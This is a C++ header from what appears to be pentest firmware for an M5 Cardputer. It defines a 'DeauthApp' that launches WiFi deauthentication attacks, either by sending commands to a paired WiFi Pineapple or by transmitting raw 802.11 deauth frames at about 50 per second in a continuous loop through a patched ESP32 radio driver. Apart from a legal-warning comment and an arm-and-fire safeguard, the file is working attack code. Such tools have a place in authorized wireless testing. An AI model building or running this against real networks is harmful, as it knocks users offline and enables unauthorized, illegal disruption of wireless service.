#pragma once
// DeauthApp — unified deauth runner. Two backends pick the transport:
//
//   Backend::Pineapple — issue a deauth command to a paired WiFi
//     Pineapple via its HTTP API. The Pineapple's radio does the
//     work; the Cardputer drives. Single-shot per Fn+Enter.
//
//   Backend::Native — TX 802.11 deauth frames directly from the
//     Cardputer's onboard radio via IWifiMonitor::tx_raw. Uses the
//     patched-libnet80211 path on ESP32 (zmuldefs override of
//     ieee80211_freedom_output) — the same hack Bruce / ESP32-
//     Marauder use. Continuous TX while firing_ is true.
//
// LEGAL: TXing deauth frames against networks you do not own /
// do not have written authorization to test is a violation of
// FCC Part 15 in the US and equivalent laws elsewhere. App ships
// disarmed; user must Tab to arm and Fn+Enter to fire.
//
// Keys:
//   b           — toggle backend (only when not firing)
//   Tab         — arm / disarm
//   Up / Down   — channel
//   Fn+Enter    — fire (PA: one-shot, Native: toggle continuous TX)
#include "yui/app/App.hpp"
#include "yui/hal/IStorage.hpp"
#include "yui/hal/IWifiMonitor.hpp"
#include "yui/proto/Dot11.hpp"
#include "yui/proto/Pineapple.hpp"
#include "yui/types.hpp"
#include <cstdio>
#include <cstring>

#include "yui/ui/Chrome.hpp"
#include "yui/ui/Tokens.hpp"
namespace yui {

class DeauthApp : public App {
 public:
  enum class Backend { Pineapple, Native };

  static constexpr uint32_t kPerFrameMs = 20;  // Native: ~50 frames/sec/target

  DeauthApp(IHttp& http, IStorage& store, IWifiMonitor& mon)
      : pa_client_(http, &store), store_(store), mon_(mon) {}

  const char* name() const override { return "Deauth"; }
  Category    category() const override { return Category::WiFi; }

  void on_enter(Hal& hal) override {
    hal_           = &hal;
    armed_         = false;
    firing_        = false;
    fired_         = false;
    last_ok_       = false;
    last_failure_  = false;
    tx_total_      = 0;
    last_tx_ms_    = 0;
    std::strncpy(bssid_str_,  "00:00:00:00:00:00", sizeof(bssid_str_));
    std::strncpy(client_str_, "FF:FF:FF:FF:FF:FF", sizeof(client_str_));
    if (backend_ == Backend::Native) {
      WifiFilter f{}; f.mgmt = false; f.data = false; f.ctrl = false;
      mon_.start(f, channel_);
    }
  }

  void on_exit() override {
    firing_ = false;
    if (backend_ == Backend::Native) mon_.stop();
  }

  void on_key(KeyEvent k) override {
    if (!k.down) return;
    if (k.key == Key::Char && (k.ch == 'b' || k.ch == 'B') && !firing_) {
      switch_backend_(backend_ == Backend::Pineapple ? Backend::Native
                                                     : Backend::Pineapple);
      return;
    }
    if (k.key == Key::Tab) armed_ = !armed_;
    if (k.key == Key::Up   && channel_ < 13) {
      ++channel_;
      if (backend_ == Backend::Native) mon_.set_channel(channel_);
    }
    if (k.key == Key::Down && channel_ > 1) {
      --channel_;
      if (backend_ == Backend::Native) mon_.set_channel(channel_);
    }
    if (k.key == Key::Enter && k.fn && armed_) {
      if (backend_ == Backend::Pineapple) fire_pa_();
      else                                firing_ = !firing_;
    }
  }

  void tick(uint32_t now_ms) override {
    if (backend_ != Backend::Native || !firing_) return;
    if (now_ms - last_tx_ms_ < kPerFrameMs && last_tx_ms_ != 0) return;
    last_tx_ms_ = now_ms == 0 ? 1 : now_ms;
    uint8_t bssid[6], client[6];
    if (!dot11::parse_mac(bssid_str_,  bssid))  { firing_ = false; return; }
    if (!dot11::parse_mac(client_str_, client)) { firing_ = false; return; }
    uint8_t frame[64];
    const size_t n = dot11::build_deauth(frame, sizeof(frame), client, bssid);
    if (n == 0 || !mon_.tx_raw(frame, n)) {
      last_failure_ = true;
      firing_       = false;
      return;
    }
    ++tx_total_;
  }

  void render(IDisplay& d) override {
    d.clear(ui::kSurface);
    ui::Chrome::header(d,
        backend_ == Backend::Pineapple ? "Deauth (PA)" : "Deauth (native)");

    char line[40];
    int y = 22;
    std::snprintf(line, sizeof(line), "Backend: %s",
                  backend_ == Backend::Pineapple ? "Pineapple" : "Native");
    d.draw_text_styled(8, y, line, ui::kAccent, ui::kSurface,
                       FontStyle::Body); y += 13;
    std::snprintf(line, sizeof(line), "Tgt:  %s", bssid_str_);
    d.draw_text_styled(8, y, line, ui::kOnSurface, ui::kSurface,
                       FontStyle::Body); y += 13;
    if (backend_ == Backend::Native) {
      std::snprintf(line, sizeof(line), "Sta:  %s", client_str_);
      d.draw_text_styled(8, y, line, ui::kOnSurface, ui::kSurface,
                         FontStyle::Body); y += 13;
      std::snprintf(line, sizeof(line), "Ch: %u   Sent: %u",
                    static_cast<unsigned>(channel_),
                    static_cast<unsigned>(tx_total_));
      d.draw_text_styled(8, y, line, ui::kOnSurface, ui::kSurface,
                         FontStyle::Body); y += 13;
      std::snprintf(line, sizeof(line), "Armed:%s  Firing:%s",
                    armed_ ? "Y" : "n", firing_ ? "YES" : "no");
      d.draw_text_styled(8, y, line,
                         firing_ ? ui::kWarn : ui::kAccentDark,
                         ui::kSurface, FontStyle::Body);
      y += 13;
      if (last_failure_)
        d.draw_text_styled(8, y, "TX failed (libnet?)", ui::kWarn,
                           ui::kSurface, FontStyle::Caption);
    } else {
      std::snprintf(line, sizeof(line), "Channel: %u",
                    static_cast<unsigned>(channel_));
      d.draw_text_styled(8, y, line, ui::kOnSurface, ui::kSurface,
                         FontStyle::Body); y += 13;
      std::snprintf(line, sizeof(line), "Armed: %s", armed_ ? "YES" : "no");
      d.draw_text_styled(8, y, line,
                         armed_ ? ui::kWarn : ui::kAccentDark,
                         ui::kSurface, FontStyle::Body);
      y += 13;
      if (fired_)
        d.draw_text_styled(8, y,
                           last_ok_ ? "Last fire: ok" : "Last fire: FAIL",
                           last_ok_ ? ui::kAccent : ui::kWarn,
                           ui::kSurface, FontStyle::Caption);
    }
    ui::Chrome::footer(d, "b:backend Tab:arm Fn+Enter:fire");
    d.flush();
  }

  // Configuration / test hooks
  Backend backend() const { return backend_; }
  void    set_backend(Backend b) { switch_backend_(b); }

  void set_target(const char* bssid, uint8_t ch) {
    std::strncpy(bssid_str_, bssid ? bssid : "", sizeof(bssid_str_) - 1);
    bssid_str_[sizeof(bssid_str_) - 1] = '\0';
    channel_ = ch;
    if (backend_ == Backend::Native) mon_.set_channel(ch);
  }
  void set_target(const char* bssid, const char* client) {
    std::strncpy(bssid_str_,  bssid  ? bssid  : "00:00:00:00:00:00",
                 sizeof(bssid_str_) - 1);
    std::strncpy(client_str_, client ? client : "FF:FF:FF:FF:FF:FF",
                 sizeof(client_str_) - 1);
    bssid_str_[sizeof(bssid_str_) - 1]  = '\0';
    client_str_[sizeof(client_str_) - 1] = '\0';
  }
  void set_channel(uint8_t ch) {
    channel_ = ch;
    if (backend_ == Backend::Native) mon_.set_channel(ch);
  }

  bool    armed()        const { return armed_; }
  bool    firing()       const { return firing_; }
  bool    fired()        const { return fired_; }
  bool    last_ok()      const { return last_ok_; }
  bool    last_failure() const { return last_failure_; }
  size_t  tx_total()     const { return tx_total_; }
  uint8_t channel()      const { return channel_; }

 private:
  void switch_backend_(Backend b) {
    if (b == backend_) return;
    if (backend_ == Backend::Native) mon_.stop();
    backend_ = b;
    armed_  = false;
    firing_ = false;
    if (backend_ == Backend::Native && hal_ != nullptr) {
      WifiFilter f{}; f.mgmt = false; f.data = false; f.ctrl = false;
      mon_.start(f, channel_);
    }
  }

  void fire_pa_() {
    fired_ = true;
    if (!ensure_pa_authed_()) { last_ok_ = false; return; }
    last_ok_ = pa_client_.deauth_ap(bssid_str_, channel_, 1);
  }

  bool ensure_pa_authed_() {
    if (pa_client_.authenticated()) return true;
    char host[64] = {0};
    if (!store_.get_str("pa.host", host, sizeof(host)) || host[0] == 0) return false;
    int32_t port = 1471;
    store_.get_int("pa.port", port, 1471);
    char user[40] = {0}, pass[40] = {0};
    store_.get_str("pa.user", user, sizeof(user));
    store_.get_str("pa.pass", pass, sizeof(pass));
    return pa_client_.login(host, static_cast<uint16_t>(port), user, pass);
  }

  pineapple::Client pa_client_;
  IStorage&         store_;
  IWifiMonitor&     mon_;
  Hal*              hal_           = nullptr;
  Backend           backend_       = Backend::Pineapple;
  uint8_t           channel_       = 6;
  bool              armed_         = false;
  bool              firing_        = false;
  bool              fired_         = false;
  bool              last_ok_       = false;
  bool              last_failure_  = false;
  size_t            tx_total_      = 0;
  uint32_t          last_tx_ms_    = 0;
  char              bssid_str_[18]  = {0};
  char              client_str_[18] = {0};
};

}  // namespace yui
